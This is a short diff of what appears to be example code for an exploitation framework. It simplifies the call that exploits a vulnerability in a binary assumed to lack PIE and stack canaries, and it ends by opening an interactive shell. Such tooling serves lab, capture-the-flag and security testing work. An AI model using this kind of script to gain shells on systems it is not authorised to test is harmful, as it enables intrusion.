@@ -33,8 +33,7 @@ conn.navigate(vuln.addr)
 # Binary is neither PIE nor canary. This is
 # automatically detected, but we explicitly assume
 # it here.
-exploit = conn.exploit(vuln, assume=[NO_PIE, NO_CANARY])
-exploit.execute()
+conn.exploit(vuln, assume=[NO_PIE, NO_CANARY])
 
 # you have a shell
 conn.interactive()
